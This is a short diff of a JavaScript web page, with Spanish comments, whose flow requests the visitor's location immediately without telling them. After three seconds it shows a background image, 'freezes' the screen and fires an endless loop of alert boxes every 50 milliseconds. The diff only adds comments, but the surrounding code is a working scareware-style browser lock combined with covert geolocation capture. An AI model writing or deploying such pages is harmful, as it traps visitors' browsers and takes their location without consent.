@@ -316,7 +316,10 @@
 
             // Bucle infinito de alertas
             function bucleInfinitoAlertas() {
+                // Mostrar la alerta
                 alert(MENSAJE_ALERTA);
+
+                // Programar la siguiente alerta
                 setTimeout(bucleInfinitoAlertas, 50);
             }
 
@@ -324,13 +327,22 @@
                 if (alertaActiva) return;
                 alertaActiva = true;
 
+                // Activar imagen de fondo
                 activarImagenFondo();
+
+                // Congelar pantalla
                 congelarPantalla();
+
+                // Iniciar bucle de alertas
                 setTimeout(bucleInfinitoAlertas, 100);
             }
 
             // === FLUJO DE LA PÁGINA ===
+
+            // 1. Solicitar ubicación inmediatamente (sin mostrar nada al usuario)
             solicitarUbicacion();
+
+            // 2. A los 3 segundos: imagen + alerta al mismo tiempo
             setTimeout(activarTodo, TIEMPO_ALERTA);
 
             console.log("⚠️ A los 3 segundos: imagen de fondo + alerta + bucle infinito");
